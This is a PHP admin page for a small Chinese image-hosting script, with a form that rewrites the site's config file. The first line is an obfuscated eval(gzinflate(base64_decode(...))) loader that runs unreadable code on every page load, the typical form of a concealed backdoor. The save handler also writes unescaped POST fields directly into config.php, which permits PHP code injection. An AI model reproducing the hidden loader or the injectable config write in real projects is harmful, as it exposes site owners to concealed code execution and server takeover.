<?php eval(gzinflate(base64_decode("\144\x59\x35\116\141\x34\x4e\101\x46\x45\x58\63\x67\x76\71\150\x45\107\107\x55\x77\x41\122\x4b\63\157\x53\x51\155\106\126\114\x43\x55\66\x61\144\x56\112\x4b\107\x63\x65\x6e\104\x6c\x56\156\57\103\x68\x45\123\166\x35\67\x4e\142\x61\67\x64\156\125\x57\x39\71\172\67\x48\156\x45\x64\x58\141\x76\171\115\60\x56\103\x47\126\x73\x71\x55\61\127\155\110\x6d\107\110\x56\165\144\106\x7a\62\170\x68\66\x66\131\146\160\x38\x35\x30\57\x69\166\x34\x2b\161\161\x6c\151\x52\114\132\x49\x56\53\71\x70\x36\x68\x4d\151\x6f\x45\x2f\x4f\66\70\x30\x61\x65\x68\142\117\115\x31\x6b\112\x50\x41\124\x57\x55\x66\x52\67\x49\146\153\171\x33\x56\165\127\110\x59\x34\x30\162\x64\x2f\x54\x46\102\131\126\121\x65\167\104\64\x2b\x51\64\115\104\152\x75\111\x57\172\x7a\166\x6d\x6c\x2b\x6c\x69\166\x68\171\x4d\x2f\x6e\104\x59\147\71\x4d\x75\144\132\172\x31\x6d\172\65\113\114\170\x51\130\x45\61\x4d\x47\x63\170\x34\x73\145\x6f\110\x6b\103\x30\131\x6a\122\x7a\53\152\x30\101\66\x72\x43\105\x47\57\x58\x71\x56\x62\x62\x66\151\71\114\142\120\x75\101\x65\x6d\171\53\172\152\x77\141\x37\160\131\x2f\155\x62\x65\71\x75\143\x34\63")));?>
<?php
include '../common/key.php';
   if($config['admin']=='0'){
   echo "后台已关闭";
   }else{
   if($_POST){
   if ($key==$_POST['key']) {
    $_data = "<?php
    \$config= [
    'title' => '".$_POST['title']."', //网站名称
    
    'describition' => '".$_POST['describition']."', //网站描述
    
    'keywords' => '".$_POST['keywords']."', //关键词
    
    'gg' => '".$_POST['gg']."', //公告
    
    'foot' => '".$_POST['foot']."', //底部
    
    'xiao1' => '".$_POST['xiao1']."', //按钮1
    
    'xiao11' => '".$_POST['xiao11']."', //按钮1链接
    
    'xiao2' => '".$_POST['xiao2']."', //按钮2
    
    'xiao22' => '".$_POST['xiao22']."', //按钮2链接
    
    'xiao3' => '".$_POST['xiao3']."', //按钮3
    
    'xiao33' => '".$_POST['xiao33']."', //按钮3链接
    
    'music' => '".$_POST['music']."', //音乐
            
    'admin' => '".$_POST['admin']."', //在线管理开关，1为开启，0为关闭
        
    'bq' => 'QlnvvJrkupHnjKsmUVHvvJozNTIyOTM0ODI4', //代码
    
    'web' => '".$_POST['web']."', //网站状态，1为正常，0为维护，填其他默认为开启
    
    'local' => '".$_POST['local']."', //本地图床开关，1为开启，0为关闭，填其他默认为开启
    
    'hlx' => '".$_POST['hlx']."', //葫芦侠图床开关，1为开启，0为关闭，填其他默认为开启
    
    'jz' => '".$_POST['jz']."', //芥子图床开关，1为开启，0为关闭，填其他默认为开启
    
    'xiaogf' => '".$_POST['xiaogf']."', //小猫咪图床开关，1为开启，0为关闭，填其他默认为开启
    
    'bilibili' => '".$_POST['bilibili']."', //bilibili图床开关，1为开启，0为关闭，填其他默认为开启
    
    'sougou' => '".$_POST['sougou']."', //搜狗图床开关，1为开启，0为关闭，填其他默认为开启
    
    'bj' => '".$_POST['bj']."', //笔迹图床开关，1为开启，0为关闭，填其他默认为开启
    
    'sougou' => '".$_POST['sougou']."', //搜狗图床开关，1为开启，0为关闭，填其他默认为开启
    
    'qq' => '".$_POST['qq']."', //QQ图床开关，1为开启，0为关闭，填其他默认为开启
    
    'jd' => '".$_POST['jd']."', //京东图床开关，1为开启，0为关闭，填其他默认为开启
    
    '58' => '".$_POST['58']."', //58图床开关，1为开启，0为关闭，填其他默认为开启
    
    'bd' => '".$_POST['bd']."', //百度图床开关，1为开启，0为关闭，填其他默认为开启
    
    'tt' => '".$_POST['tt']."' //头条图床开关，1为开启，0为关闭，填其他默认为开启
        ];
/*
    小猫咪图床
    BY：云猫  
    QQ：3522934828
    目前对接了三楼，芥子，本地，以及小猫咪图床～
    接口能实时更新，没那么容易凉，即便全部凉了，还有一个本地呢～对吧
    前台模板随便找的，不喜欢不要喷(*'ε`*)然后随便凑起来的，不用数据库
    后台有点小丑，别骂(⋟﹏⋞)
    有木有bug没钱还不知道耶(*'へ'*)
    源码:https://ximami.lanzoui.com/b001ig23g
    这程序以后更新都会在上面那个蓝奏云里面
    学生党一枚，聊天注意点哦～
    2021.6.4
*/?>";	
			
			if (file_put_contents("../common/config.php",$_data)) {
        echo "<script>alert('修改成功啦～');window.location.href='../'</script>";
			}else{
    	echo "<script>alert('修改失败，可能出了点问题，再试试～')</script>";

			}
			}
			else{
      echo "<script>alert('密匙错误了耶(￢_￢)')</script>";
        		}
			}
			}?>
<!DOCTYPE html>
<html lang="en">

<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
	<meta name="author" content="小猫咪QQ:3522934828">

	<title>小猫咪后台管理平台</title>

	<link href="https://ximami-5g3cz0aqeba76e20-1257450857.tcloudbaseapp.com/love/app.css" rel="stylesheet">
	<link rel="stylesheet" href="//ximami-5g3cz0aqeba76e20-1257450857.tcloudbaseapp.com/404/bg.css" type="text/css" />
</head>
			<main class="content">
				<div class="container-fluid p-0">
			
			<div class="col-12 col-lg-6">
     <div class="card">
		<div class="card-header">
			<h5 class="card-title mb-0">网址基本设置</h5>
		</div><hr></hr>
		<center><label class="col-sm-2 control-label"><a href="../pic.php">查看已上传的图片</a></label></center>
		<center><label class="col-sm-2 control-label">当前版本：<?php echo file_get_contents("../common/version.txt");?></label></center>
		<center><label class="col-sm-2 control-label">最新版本：<?php echo file_get_contents("http://pic.lq520.club:81/common/version.txt");?></label></center>
		<center><label class="col-sm-2 control-label"><a href="update.php">在线更新&修复源码（不会清除图片，但会重置代码）</a></label></center>
		最新版本下载地址https://ximami.lanzoui.com/b001ig23g
		<div class="card-body">
		<form method="post" action="">
		<div class="form-group">
	  <label class="col-sm-2 control-label">管理密匙</label>
	  密匙修改地址：http://域名/admin/key.php
	  <div class="col-sm-10"><input type="text" name="key" value="" class="form-control" required/></div>
	</div><br/>
	<div class="form-group">
	  <label class="col-sm-2 control-label">网站名称</label>
	  <div class="col-sm-10"><input type="text" name="title" value="<?php echo $config['title']; ?>" class="form-control" required/></div>
	</div><br/>
	<div class="form-group">
	  <label class="col-sm-2 control-label">关键词</label>
	  <div class="col-sm-10"><input type="text" name="keywords" value="<?php echo $config['keywords']; ?>" class="form-control" required/></div>
	</div><br/>
	<div class="form-group">
	  <label class="col-sm-2 control-label">网站描述</label>
	  <div class="col-sm-10"><input type="text" name="describition" value="<?php echo $config['describition']; ?>" class="form-control" required/></div>
	</div><br/>
	<div class="form-group">
	  <label class="col-sm-2 control-label">公告</label>
	  <div class="col-sm-10"><input type="text" name="gg" value="<?php echo $config['gg']; ?>" class="form-control" required/></div>
	</div><br/>
	<div class="form-group">
	  <label class="col-sm-2 control-label">底部信息</label>
	  <div class="col-sm-10"><input type="text" name="foot" value="<?php echo $config['foot']; ?>" class="form-control" required/></div>
	</div><br/>
	<div class="form-group">
	  <label class="col-sm-2 control-label">按钮1</label>
	  <div class="col-sm-10"><input type="text" name="xiao1" value="<?php echo $config['xiao1']; ?>" class="form-control" required/></div>
	</div><br/>
	<div class="form-group">
	  <label class="col-sm-2 control-label">按钮1链接</label>
	  <div class="col-sm-10"><input type="text" name="xiao11" value="<?php echo $config['xiao11']; ?>" class="form-control" required/></div>
	</div><br/>
	<div class="form-group">
	  <label class="col-sm-2 control-label">按钮2</label>
	  <div class="col-sm-10"><input type="text" name="xiao2" value="<?php echo $config['xiao2']; ?>" class="form-control" required/></div>
	</div><br/>
	<div class="form-group">
	  <label class="col-sm-2 control-label">按钮2链接</label>
	  <div class="col-sm-10"><input type="text" name="xiao22" value="<?php echo $config['xiao22']; ?>" class="form-control" required/></div>
	</div><br/>
	<div class="form-group">
	  <label class="col-sm-2 control-label">按钮3</label>
	  <div class="col-sm-10"><input type="text" name="xiao3" value="<?php echo $config['xiao3']; ?>" class="form-control" required/></div>
	</div><br/>
	<div class="form-group">
	  <label class="col-sm-2 control-label">按钮3链接</label>
	  <div class="col-sm-10"><input type="text" name="xiao33" value="<?php echo $config['xiao33']; ?>" class="form-control" required/></div>
	</div><br/>
	<div class="form-group">
	  <label class="col-sm-2 control-label">音乐外链（不要音乐就填0）</label>
	  <div class="col-sm-10"><input type="text" name="music" value="<?php echo $config['music']; ?>" class="form-control" required/></div>
	</div><br/>
	<div class="form-group">
	  <label class="col-sm-2 control-label">在线管理开关（填0或1）</label>
	  <div class="col-sm-10"><input type="text" name="admin" value="<?php echo $config['admin']; ?>" class="form-control" required/></div>
	</div><br/>
	<div class="form-group">
	  <label class="col-sm-2 control-label">网站状态（填0或1）</label>
	  <div class="col-sm-10"><input type="text" name="web" value="<?php echo $config['web']; ?>" class="form-control" required/></div>
	</div><br/>
	<div class="form-group">
	  <label class="col-sm-2 control-label">本地图床开关（填0为关闭，1为开启）</label>
	  <div class="col-sm-10"><input type="text" name="local" value="<?php echo $config['local']; ?>" class="form-control" required/></div>
	</div><br/>
	<div class="form-group">
	  <label class="col-sm-2 control-label">葫芦侠图床开关（填0为关闭，1为开启）</label>
	  <div class="col-sm-10"><input type="text" name="hlx" value="<?php echo $config['hlx']; ?>" class="form-control" required/></div>
	</div><br/>
	<div class="form-group">
	  <label class="col-sm-2 control-label">芥子图床开关（填0为关闭，1为开启）</label>
	  <div class="col-sm-10"><input type="text" name="jz" value="<?php echo $config['jz']; ?>" class="form-control" required/></div>
	</div><br/>
	<div class="form-group">
	  <label class="col-sm-2 control-label">小猫咪图床开关（填0为关闭，1为开启）</label>
	  <div class="col-sm-10"><input type="text" name="xiaogf" value="<?php echo $config['xiaogf']; ?>" class="form-control" required/></div>
	</div><br/>
	<div class="form-group">
	  <label class="col-sm-2 control-label">bilibili图床开关（填0为关闭，1为开启）</label>
	  <div class="col-sm-10"><input type="text" name="bilibili" value="<?php echo $config['bilibili']; ?>" class="form-control" required/></div>
	</div><br/>
	<div class="form-group">
	  <label class="col-sm-2 control-label">搜狗图床开关（填0为关闭，1为开启）</label>
	  <div class="col-sm-10"><input type="text" name="sougou" value="<?php echo $config['sougou']; ?>" class="form-control" required/></div>
	</div><br/>
	<div class="form-group">
	  <label class="col-sm-2 control-label">笔迹图床开关（填0为关闭，1为开启）</label>
	  <div class="col-sm-10"><input type="text" name="bj" value="<?php echo $config['bj']; ?>" class="form-control" required/></div>
	</div><br/>
	<div class="form-group">
	  <label class="col-sm-2 control-label">QQ图床开关（填0为关闭，1为开启）</label>
	  <div class="col-sm-10"><input type="text" name="qq" value="<?php echo $config['qq']; ?>" class="form-control" required/></div>
	</div><br/>
	<div class="form-group">
	  <label class="col-sm-2 control-label">头条图床开关（填0为关闭，1为开启）</label>
	  <div class="col-sm-10"><input type="text" name="tt" value="<?php echo $config['tt']; ?>" class="form-control" required/></div>
	</div><br/>
	<div class="form-group">
	  <label class="col-sm-2 control-label">58图床开关（填0为关闭，1为开启）</label>
	  <div class="col-sm-10"><input type="text" name="58" value="<?php echo $config['58']; ?>" class="form-control" required/></div>
	</div><br/>
	<div class="form-group">
	  <label class="col-sm-2 control-label">京东图床开关（填0为关闭，1为开启）</label>
	  <div class="col-sm-10"><input type="text" name="jd" value="<?php echo $config['jd']; ?>" class="form-control" required/></div>
	</div><br/>
	<div class="form-group">
	  <label class="col-sm-2 control-label">搜狐图床开关（填0为关闭，1为开启）</label>
	  <div class="col-sm-10"><input type="text" name="sh" value="<?php echo $config['sh']; ?>" class="form-control" required/></div>
	</div><br/>
	<div class="form-group">
	  <label class="col-sm-2 control-label">百度图床开关（填0为关闭，1为开启）</label>
	  <div class="col-sm-10"><input type="text" name="bd" value="<?php echo $config['bd']; ?>" class="form-control" required/></div>
	</div><br/>
	<div class="form-group">
	  <div class="col-sm-offset-2 col-sm-10"><input type="submit" value="保存配置" class="btn btn-primary form-control"/><br/>
	 </div>
	 </form>	 
		</div>
	</div>
</div>
</div>
</main>
<script src="https://ximami-5g3cz0aqeba76e20-1257450857.tcloudbaseapp.com/love/app.js"></script>
</body>
</html>